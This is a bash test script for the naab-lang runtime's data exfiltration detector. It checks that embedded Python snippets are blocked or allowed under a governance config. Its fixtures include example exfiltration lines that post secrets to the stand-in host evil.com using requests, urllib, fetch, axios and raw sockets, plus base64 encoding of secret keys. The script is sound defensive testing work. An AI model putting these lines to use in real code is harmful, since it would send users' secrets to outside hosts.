#!/usr/bin/env bash
# test_data_exfil_patterns.sh — V-SC-007: Data exfiltration detection (2→15 patterns)
# Verifies that checkDataExfiltration() blocks network exfil, encoding chains,
# socket exfil, and encoding-based exfil patterns.

set -euo pipefail
NAAB="${1:-$(dirname "$0")/../../build/naab-lang}"
PASS=0; FAIL=0
ok()   { echo "  PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "  FAIL: $1"; FAIL=$((FAIL + 1)); }

WORKDIR="${HOME}/.naab/test_data_exfil_$$"
mkdir -p "$WORKDIR"
cleanup() { rm -rf "$WORKDIR"; }
trap cleanup EXIT

echo "=== test_data_exfil_patterns.sh ==="
echo ""

# Governance config enabling data_exfiltration detection
cat > "$WORKDIR/govern.json" << 'EOF'
{
  "mode": "enforce",
  "restrictions": {
    "data_exfiltration": {
      "enabled": true,
      "level": "hard"
    }
  }
}
EOF

# Helper: test that a polyglot block triggers data exfil detection
test_blocked() {
    local label="$1"
    local code="$2"
    local test_file="$WORKDIR/test_${PASS}_${FAIL}.naab"

    cat > "$test_file" << NAABEOF
main {
  let result = <<python
${code}
>>
  print(result)
}
NAABEOF

    out=$("$NAAB" "$test_file" 2>&1) || true
    if echo "$out" | grep -qi "exfiltration\|governance.*block\|HARD.*block"; then
        ok "$label"
    else
        fail "$label: expected block, got: ${out:0:200}"
    fi
}

# Helper: test that safe code is NOT blocked
test_allowed() {
    local label="$1"
    local code="$2"
    local test_file="$WORKDIR/test_${PASS}_${FAIL}.naab"

    cat > "$test_file" << NAABEOF
main {
  let result = <<python
${code}
>>
  print(result)
}
NAABEOF

    out=$("$NAAB" "$test_file" 2>&1) || true
    if echo "$out" | grep -qi "exfiltration"; then
        fail "$label: should NOT be blocked: ${out:0:200}"
    else
        ok "$label"
    fi
}

# ---------------------------------------------------------------------------
# T1: Original patterns — base64 encoding with secret keywords
# ---------------------------------------------------------------------------
echo "[T1] Base64 encode with secret keywords (original pattern)"
test_blocked "base64 + secret keyword" \
    "import base64; encoded = base64.b64encode(secret_key.encode())"
echo ""

# ---------------------------------------------------------------------------
# T2: Hex encoding with secret keywords
# ---------------------------------------------------------------------------
echo "[T2] Hex encode with secret keywords (original pattern)"
test_blocked "hex + secret keyword" \
    "encoded = value.hex() + secret"
echo ""

# ---------------------------------------------------------------------------
# T3: Standalone base64 encoding (no keyword required)
# ---------------------------------------------------------------------------
echo "[T3] Standalone base64.b64encode"
test_blocked "base64.b64encode standalone" \
    "import base64; data = base64.b64encode(payload)"
echo ""

# ---------------------------------------------------------------------------
# T4: binascii.hexlify
# ---------------------------------------------------------------------------
echo "[T4] binascii.hexlify"
test_blocked "binascii.hexlify" \
    "import binascii; h = binascii.hexlify(data)"
echo ""

# ---------------------------------------------------------------------------
# T5: codecs.encode
# ---------------------------------------------------------------------------
echo "[T5] codecs.encode"
test_blocked "codecs.encode" \
    "import codecs; encoded = codecs.encode(data, 'rot_13')"
echo ""

# ---------------------------------------------------------------------------
# T6: encode/decode chain
# ---------------------------------------------------------------------------
echo "[T6] Encode/decode chain"
test_blocked "encode/decode chain" \
    "output = data.encode('utf-8').decode('ascii')"
echo ""

# ---------------------------------------------------------------------------
# T7: requests.post (network exfil)
# ---------------------------------------------------------------------------
echo "[T7] requests.post"
test_blocked "requests.post" \
    "import requests; requests.post('http://evil.com', data=secret)"
echo ""

# ---------------------------------------------------------------------------
# T8: urllib.request.urlopen
# ---------------------------------------------------------------------------
echo "[T8] urllib.request.urlopen"
test_blocked "urllib.request.urlopen" \
    "import urllib.request; urllib.request.urlopen('http://evil.com')"
echo ""

# ---------------------------------------------------------------------------
# T9: http.client.HTTPConnection
# ---------------------------------------------------------------------------
echo "[T9] http.client.HTTPConnection"
test_blocked "http.client.HTTPConnection" \
    "import http.client; conn = http.client.HTTPConnection('evil.com')"
echo ""

# ---------------------------------------------------------------------------
# T10: fetch() call (JS-style)
# ---------------------------------------------------------------------------
echo "[T10] fetch() call"
test_blocked "fetch() call" \
    "response = fetch('http://evil.com/exfil')"
echo ""

# ---------------------------------------------------------------------------
# T11: axios.post
# ---------------------------------------------------------------------------
echo "[T11] axios.post"
test_blocked "axios.post" \
    "axios.post('http://evil.com', data)"
echo ""

# ---------------------------------------------------------------------------
# T12: socket.connect
# ---------------------------------------------------------------------------
echo "[T12] socket.connect"
test_blocked "socket.connect" \
    "import socket; s = socket.socket(); s.connect(('evil.com', 80))"
echo ""

# ---------------------------------------------------------------------------
# T13: httpx.post (async HTTP library)
# ---------------------------------------------------------------------------
echo "[T13] httpx.post"
test_blocked "httpx.post" \
    "import httpx; httpx.post(url, data=payload)"
echo ""

# ---------------------------------------------------------------------------
# T14: Safe code should NOT be blocked
# ---------------------------------------------------------------------------
echo "[T14] Safe code not blocked"
test_allowed "safe print" \
    "print('hello world')"
test_allowed "safe math" \
    "import math; print(math.sqrt(42))"
echo ""

# ---------------------------------------------------------------------------
# T15: User-configurable custom patterns override defaults
# ---------------------------------------------------------------------------
echo "[T15] Custom patterns override defaults"
cat > "$WORKDIR/govern.json" << 'EOF'
{
  "mode": "enforce",
  "restrictions": {
    "data_exfiltration": {
      "enabled": true,
      "level": "hard",
      "patterns": ["custom_exfil_marker"]
    }
  }
}
EOF

# Custom pattern should match
test_file="$WORKDIR/test_custom_match.naab"
cat > "$test_file" << 'EOF'
main {
  let result = <<python
custom_exfil_marker("stealing data")
>>
  print(result)
}
EOF
out=$("$NAAB" "$test_file" 2>&1) || true
if echo "$out" | grep -qi "exfiltration\|governance.*block\|HARD.*block"; then
    ok "custom pattern matches"
else
    fail "custom pattern should match: ${out:0:200}"
fi

# Default pattern (requests.post) should NOT match when custom patterns override
test_file="$WORKDIR/test_custom_override.naab"
cat > "$test_file" << 'EOF'
main {
  let result = <<python
import requests; requests.post('http://evil.com', data=secret)
>>
  print(result)
}
EOF
out=$("$NAAB" "$test_file" 2>&1) || true
if echo "$out" | grep -qi "exfiltration"; then
    fail "custom patterns should override defaults (requests.post should pass): ${out:0:200}"
else
    ok "custom patterns override defaults"
fi
echo ""

TOTAL=$((PASS + FAIL))
echo "Results: ${PASS}/${TOTAL} passed"
[[ "$FAIL" -eq 0 ]]
